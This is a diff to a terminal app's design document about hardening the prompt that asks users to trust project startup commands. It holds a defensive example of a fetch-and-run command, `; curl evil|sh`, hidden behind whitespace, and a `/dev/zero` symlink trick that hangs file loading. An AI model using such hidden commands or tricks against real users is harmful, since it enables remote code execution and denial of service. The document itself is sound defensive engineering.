@@ -69,10 +69,25 @@ v2/v3 additions (same design doc):
   `startup-command-trust.json` (App Support), so any change asks again.
   Declining opens the panes without typing anything and is not remembered.
   A pane that spawned while the prompt was open is typed into on approval
-  (`spawnedWhileHeld`). The prompt (`StartupCommandPrompt`) shows commands
-  through `StartupCommandDisplay`, which turns control characters into their
-  control pictures and bidi or zero-width characters into `<U+XXXX>`, so
-  what is read is what runs. "Open Without Running" is the default button.
+  (`spawnedWhileHeld`), but only while its shell is still in front
+  (`typeIntoIdleShells` probes it, like the foreground poll): the panes open
+  behind the prompt, and by the time it is answered one may run `claude` or
+  `ssh`, which would get the command. A pane hibernated meanwhile gets it when
+  it wakes. The prompt (`StartupCommandPrompt`) shows commands through
+  `StartupCommandDisplay`, which turns control characters into their control
+  pictures; bidi controls, zero-width and other invisible characters, line
+  and paragraph separators and unusual spaces into `<U+XXXX>`; and a run of
+  three or more spaces into `<N spaces>`; and forces each line left to right
+  (LRO … PDF), so right-to-left letters can't reorder its punctuation. The
+  box is sized from the laid-out text with an always-visible scroller: the
+  2026-11-14 sweep hid `; curl evil|sh` behind 2,000 spaces in a box sized by
+  counting newlines. "Open Without Running" is the default button. The window
+  floats above the main window (hidden while Zetty is in the background), so a
+  click behind it doesn't bury it with its commands waiting.
+- **`.zetty/project.json` is read with limits** (`ProjectFileIO.load`): a
+  regular file (a link to one is fine) of at most 1 MB. git can commit it as a
+  link to `/dev/zero`, which was read forever on the main thread before any
+  prompt appeared.
   **It is a plain window, never a sheet or `runModal`:** AppKit ignores
   `NSApp.terminate` while a sheet is up, before `applicationShouldTerminate`
   runs (seen in the test app: `zetty quit --force` did nothing), and the
